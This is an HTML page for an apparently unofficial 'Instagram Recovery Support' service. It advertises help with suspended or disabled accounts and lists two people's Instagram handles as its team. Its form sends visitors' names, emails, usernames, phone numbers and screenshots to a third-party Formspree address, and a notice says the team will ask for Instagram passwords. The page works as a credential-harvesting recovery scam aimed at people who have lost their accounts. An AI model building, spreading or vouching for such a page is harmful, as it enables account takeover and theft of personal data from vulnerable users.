<!DOCTYPE html>
<html lang="en">
<head>  
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Recovery Support</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
html{scroll-behavior:smooth}
body{
background:linear-gradient(-45deg,#0f172a,#1e293b,#312e81,#7c3aed);
background-size:400% 400%;
animation:bg 15s ease infinite;
color:white;padding:20px}
@keyframes bg{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
.container{max-width:1100px;margin:auto;background:rgba(255,255,255,.08);backdrop-filter:blur(18px);border:1px solid rgba(255,255,255,.15);border-radius:30px;padding:35px;box-shadow:0 10px 40px rgba(0,0,0,.35)}
.hero{text-align:center;padding:20px}
.hero h1{font-size:48px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:30px 0}
.stat{background:rgba(255,255,255,.08);padding:25px;border-radius:20px;text-align:center;transition:.3s}
.stat:hover,.team-card:hover{transform:translateY(-8px)}
form input,form textarea,form select{width:100%;padding:15px;margin:8px 0;border-radius:14px;border:none;background:rgba(255,255,255,.12);color:white}
form select option{color:black}
button{width:100%;padding:18px;border:none;border-radius:14px;font-size:18px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,#8b5cf6,#06b6d4);color:white}
.team{display:flex;justify-content:center;gap:20px;flex-wrap:wrap;margin-top:40px}
.team-card{width:260px;text-decoration:none;color:white;background:rgba(255,255,255,.08);padding:20px;border-radius:20px;text-align:center;transition:.3s}
.team-card img{width:130px;height:130px;border-radius:50%;object-fit:cover}
.notice{margin-top:25px;padding:15px;border-radius:15px;background:rgba(255,255,255,.08)}
@media(max-width:768px){.hero h1{font-size:32px}}
</style>
</head>
<body>
<div class="container">
<div class="hero">
<h1>Instagram Recovery Support</h1>
<p>Professional guidance for account recovery requests</p>
</div>

<div class="stats">
<div class="stat"><h2>500+</h2><p>Cases Reviewed</p></div>
<div class="stat"><h2>24/7</h2><p>Support Available</p></div>
<div class="stat"><h2>Fast</h2><p>Response Time</p></div>
</div>
<form action="https://formspree.io/f/mnjyzord" method="POST">

    <input type="text" name="fullname" placeholder="Full Name" required>

    <input type="email" name="email" placeholder="Email Address" required>

    <input type="text" name="instagram_username" placeholder="Instagram Username" required>

    <input type="tel" name="phone" placeholder="Phone Number (Optional)">

    <select name="issue" required>
        <option value="">Select Issue Type</option>
        <option value="Suspended Account">Suspended Account</option>
        <option value="Disabled Account">Disabled Account</option>
        <option value="Cannot Login">Cannot Login</option>
        <option value="Other Issue">Other Issue</option>
    </select>
<textarea name="details" placeholder="Describe your issue" rows="5" required></textarea>

<label>📷 Upload Screenshot (Optional)</label>
<input type="file" name="screenshot" accept="image/*">

<button type="submit">Submit Request</button>

</form>

<div class="notice">
<b>Privacy Notice:</b> We will ask for Instagram passwords for login credentials.
</div>

<h2 style="text-align:center;margin-top:40px">Our Team</h2>

<div class="team">
<a class="team-card" href="https://www.instagram.com/gentlex.tanbir/" target="_blank">
<img src="tanbir.jpg" alt="Manager">
<h3>Tanbir</h3>
<p>Manager</p>
<p>@gentlex.tanbir</p>
</a>

<a class="team-card" href="https://www.instagram.com/_nakoto0x/" target="_blank">
<img src="danger.jpg" alt="Admin">
<h3>Manish</h3>
<p>Admin</p>
<p>@_nakoto0x</p>
</a>
</div>
</div>
</body>
</html>
